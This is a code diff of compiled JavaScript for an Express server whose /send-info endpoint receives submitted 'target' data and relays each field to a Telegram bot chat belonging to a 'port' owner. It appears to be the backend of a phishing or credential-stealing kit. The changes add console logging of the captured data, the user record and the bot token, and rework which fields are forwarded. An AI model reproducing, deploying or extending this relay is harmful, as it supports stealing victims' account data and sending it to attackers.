@@ -37,7 +37,7 @@ var __generator = (this && this.__generator) || function (thisArg, body) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 var database_1 = require("./database");
-var express_1 = require("express");
+var express = require("express");
 var nemoji = require("node-emoji");
 var Telegram = require("node-telegram-bot-api");
 process.on("uncaughtExceptionMonitor", function (uexceptmonitor) { return __awaiter(void 0, void 0, void 0, function () {
@@ -54,8 +54,8 @@ process.on("unhandledRejection", function (unhandle) { return __awaiter(void 0, 
 }); });
 var userdb = new database_1.UserDatabase();
 var domaindb = new database_1.DomainDatabase();
-var app = (0, express_1.default)();
-app.use(express_1.default.json());
+var app = express();
+app.use(express.json());
 var translationTable = {
     'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
     'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
@@ -70,6 +70,7 @@ app.post("/send-info", function (req, res) { return __awaiter(void 0, void 0, vo
         switch (_a.label) {
             case 0:
                 info = req.body;
+                console.log(info);
                 if ((Object.keys(info).length - 4) > 20) {
                     return [2 /*return*/, res.json({ status: false, message: "too many keys" })];
                 }
@@ -87,6 +88,7 @@ app.post("/send-info", function (req, res) { return __awaiter(void 0, void 0, vo
                                     if (user.ban) {
                                         return [2 /*return*/, res.json({ status: false, message: "ports owner has banned" })];
                                     }
+                                    console.log(user);
                                     _theport = user.port.find(function (prt) { return prt.name === info.port; });
                                     if (!!_theport) return [3 /*break*/, 1];
                                     return [2 /*return*/, res.json({ status: false, message: "port doesnt match" })];
@@ -98,6 +100,7 @@ app.post("/send-info", function (req, res) { return __awaiter(void 0, void 0, vo
                                                     if (!dm) {
                                                         return [2 /*return*/, res.json({ status: false, message: "invalid private key" })];
                                                     }
+                                                    console.log(_theport);
                                                     bot = new Telegram(_theport.token);
                                                     entrie = Object.entries(info);
                                                     txt = build("\uD83D\uDCE6 | [ ".concat(Object.keys(info).length - 4, " ] items received\n"));
@@ -110,12 +113,26 @@ app.post("/send-info", function (req, res) { return __awaiter(void 0, void 0, vo
                                                         if (k === "port") {
                                                             continue;
                                                         }
-                                                        if (["string", "number", "boolean", "object"].includes(typeof v)) {
-                                                            txt += build("\n".concat(nemoji.random().emoji, " | ").concat(k, " : ")) + "<code>".concat(v, "</code>");
+                                                        ;
+                                                        if (k === "private_key") {
+                                                            continue;
                                                         }
-                                                        txt += "\n\n\uD83D\uDCE6 | skin : ".concat(info.skin);
-                                                        txt += "\n\uD83D\uDEDC | server number : ".concat(info.server_number);
+                                                        ;
+                                                        if (k === "skin") {
+                                                            continue;
+                                                        }
+                                                        ;
+                                                        if (k === "server_number") {
+                                                            continue;
+                                                        }
+                                                        ;
+                                                        if (["string", "number", "boolean", "object"].includes(typeof v)) {
+                                                            txt += build("\n".concat(nemoji.random().emoji, " | ").concat(k.replace("_", " "), " : ")) + "<code>".concat(v, "</code>");
+                                                        }
                                                     }
+                                                    txt += "\n\n\uD83D\uDCE6 | skin : ".concat(info.skin);
+                                                    txt += "\n\uD83D\uDEDC | server number : ".concat(info.server_number);
+                                                    res.json({ status: true });
                                                     return [4 /*yield*/, bot.sendMessage(_theport.chat, build("\uD83D\uDD78\uFE0F new #target_info\n") + txt, {
                                                             parse_mode: "HTML"
                                                         })];
